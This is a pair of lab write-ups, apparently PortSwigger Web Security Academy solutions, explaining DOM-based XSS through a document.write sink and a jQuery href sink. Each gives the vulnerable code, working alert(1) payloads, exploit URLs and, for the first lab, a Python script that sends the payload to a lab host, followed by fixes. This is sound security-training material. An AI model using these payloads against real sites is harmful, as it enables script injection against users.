[DOM XSS in document.write sink using source location.search](./DOM-XSS-in-`document.write`-sink using source-`location.search`)
[DOM XSS in jQuery anchor href attribute sink using location.search source](./DOM-XSS-in-jQuery-anchor-`href`-attribute-sink using-`location.search`-source)



## 🧪 DOM XSS in `document.write` sink using source `location.search`

### 📌 Description

This lab contains a **DOM-based Cross-Site Scripting (XSS)** vulnerability in the search functionality.

The vulnerability arises because user-controlled data from the URL (`location.search`) is passed directly into the `document.write()` function without proper sanitization.

### 🎯 Objective

Perform a DOM-based XSS attack that triggers the `alert()` function.

### 🔍 Analysis

The following JavaScript code is responsible for handling the search query:

```html
<script>  
function trackSearch(query) {  
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');  
}  
  
var query = (new URLSearchParams(window.location.search)).get('search');  
  
if (query) {  
    trackSearch(query);  
}  
</script>
```

#### 🔑 Key Points:

- **Source**: `location.search`
- **Sink**: `document.write()`
- The user input (`search` parameter) is directly injected into HTML without encoding.
- This allows an attacker to break out of the HTML context and inject arbitrary JavaScript.
### 💥 Exploitation

The input is inserted inside an HTML attribute:
```html
<img src="...searchTerms=USER_INPUT">
```

By injecting a closing quote (`"`), we can break out of the attribute and insert a `<script>` tag.
#### ✅ Payload:
```html
"/><script>alert(1)</script>
```

#### 📎 Full Exploit URL:
```html
https://URL/?search="/><script>alert(1)</script>
```

### ⚠️ Impact

An attacker can execute arbitrary JavaScript in the victim's browser, potentially leading to:

- Session hijacking
- Credential theft
- Malicious actions on behalf of the user

### 🤖 Exploit Script

```python
import requests  
  
url = "https://0a2d004804df51ce816b44e700f00004.web-security-academy.net/"  
  
payload = {  
    "search": '"/><script>alert(1)</script>'  
}  
  
response = requests.get(url, params=payload)  
  
if response.status_code == 200:  
    print("[+] Status code:", response.status_code)  
  
    if "Congratulations, you solved the lab!" in response.text:  
        print("[+] Lab solved")  
    else:  
        print("[-] Failed to solve lab")  
else:  
    print("[-] Request failed")
```




---



## 🧪DOM XSS in jQuery anchor `href` attribute sink using `location.search` source


### 📌 Description 

This lab contains a **DOM-based Cross-Site Scripting (XSS)** vulnerability in the feedback page.

The vulnerability occurs because user-controlled input from the URL (`location.search`) is used to dynamically set the `href` attribute of an anchor (`<a>`) element using jQuery’s `.attr()` method without validation.
### 🎯 Objective

Perform a DOM-based XSS attack that triggers the `alert()` function.

### 🔍 Analysis 

The following JavaScript code is responsible for handling the return link:

```html
<div class="is-linkback">
	<a id="backLink">Back</a>
</div>
<script>
	$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>
```

### 🔑 Key Points:

- **Source**: `location.search`
- **Sink**: `jQuery.attr("href", user_input)`
- The value of the `returnPath` parameter is directly assigned to the `href` attribute.
- No validation or sanitization is applied.
- The application allows user input to control the `href` attribute of a link.

This enables the use of the **`javascript:` protocol**, which executes JavaScript when the link is clicked.
### 💥 Exploitation 

The final rendered HTML becomes:

```html
<a id="backLink" hrf="[here the value of pramter]">Back</a>
```

By injecting a `javascript:` URI, we can execute arbitrary JavaScript.
### ✅  Payload 

```js
Javascript:alert(1)
```

### 📎 FULL exploit URL
```css
https://URL/feedback?returnPath=Javascript:alert(1)
```

### ⚠️ Root Cause

The vulnerability occurs because the application takes user-controlled input from `location.search` and directly assigns it to the `href` attribute of an anchor element using jQuery’s `.attr()` method.

No validation or sanitization is applied to the input, allowing an attacker to inject a malicious URL.

Specifically, the application does not restrict dangerous URI schemes such as `javascript:`, which leads to execution of arbitrary JavaScript when the link is clicked.

### ✅ Fixed

Validate and sanitize user input before assigning it to `href`
Disallow dangerous protocols such as `javascript:`

